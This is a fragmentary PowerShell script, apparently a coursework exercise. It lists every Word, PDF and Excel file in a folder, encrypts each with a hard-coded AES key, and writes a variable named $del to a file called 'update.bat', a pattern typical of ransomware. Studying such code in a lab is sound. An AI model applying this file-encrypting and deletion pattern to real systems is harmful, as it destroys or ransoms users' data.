...
# Task 1
Get-ChildItem -recurse -Include *.docx, *.pdf, *.xlsx -Path '..\Homework\Documents' | Export-Csv `
-Path files.csv
...
#    Get-ChildItem -path $f.FullName
    Invoke-AESEncryption -Mode Encrypt -Key "B@se" -Path $f.FullName
...
$del | Out-File -FilePath .\update.bat
